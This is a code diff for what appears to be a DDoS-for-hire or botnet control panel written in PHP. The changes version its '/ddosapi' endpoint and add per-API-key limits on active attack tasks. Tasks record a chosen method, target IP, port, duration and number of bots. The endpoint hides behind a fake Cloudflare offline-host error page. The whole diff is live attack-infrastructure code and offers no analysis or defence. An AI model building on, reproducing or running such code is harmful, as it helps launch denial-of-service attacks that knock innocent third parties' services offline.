@@ -31,7 +31,7 @@ $ddosMethods = array(
 );
 
 
-$router->all('/ddosapi', function() {
+$router->all('/ddosapi/v1', function() {
     $GLOBALS["template"][0] = "FakeErrors";
     $GLOBALS["template"][1] = "cloudflare_offlinehost";
 
@@ -80,15 +80,16 @@ $router->all('/ddosapi', function() {
                     }
                 }
 
-                /*
-                 * todo
-                    $stmt = $GLOBALS["pdo"]->query("SELECT * FROM ddos_tasks WHERE");
-                    $user = $stmt->fetch();
-                    if(intval($user["max_tasks"]))
-                 */
 
-                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status) VALUES (?, ?, ?, ?, ?)");
-                $bool = $statement->execute(array($_REQUEST["method"], $_REQUEST["targetip"], $_REQUEST["maxtime"], $_REQUEST["port"], "none"));
+                $statement = $GLOBALS["pdo"]->prepare("SELECT count(*) as count FROM ddos_tasks WHERE origin_from = ? AND created_by = ? AND status = ? ");
+                $statement->execute(array("api",$_REQUEST["apikey"],"active"));
+                $count = $statement->fetch();
+                if($count["count"] >= intval($user["max_tasks"])){
+                    die('Max Task Limit');
+                }
+
+                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status,created_by,origin_from,max_executions) VALUES (?, ?, ?, ?, ?, ?, ?,?)");
+                $bool = $statement->execute(array($_REQUEST["method"], $_REQUEST["targetip"], $_REQUEST["maxtime"], $_REQUEST["port"], "none",$_REQUEST["apikey"],"api",$user["max_bots_per_task"]));
                 if($bool){
                     echo json_encode(array("taskid"=>$GLOBALS["pdo"]->lastInsertId()),true);
                     die();
@@ -119,9 +120,20 @@ $router->all('/ddosapi', function() {
                 if(!is_integer(intval($_REQUEST["id"]))){
                     die("Task id needs to be a int");
                 }
+
                 $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE id = ?");
                 $statement->execute(array($_REQUEST["id"]));
                 $details = $statement->fetch();
+
+                if($details["status"] != "active"){
+                    $statement = $GLOBALS["pdo"]->prepare("SELECT count(*) as count FROM ddos_tasks WHERE origin_from = ? AND created_by = ? AND status = ? ");
+                    $statement->execute(array("api",$_REQUEST["apikey"],"active"));
+                    $count = $statement->fetch();
+                    if($count["count"] >= intval($user["max_tasks"])){
+                        die('Max Task Limit');
+                    }
+                }
+
                 $status = 'active';
                 if ($details["status"] == "active") {
                     $status = 'none';
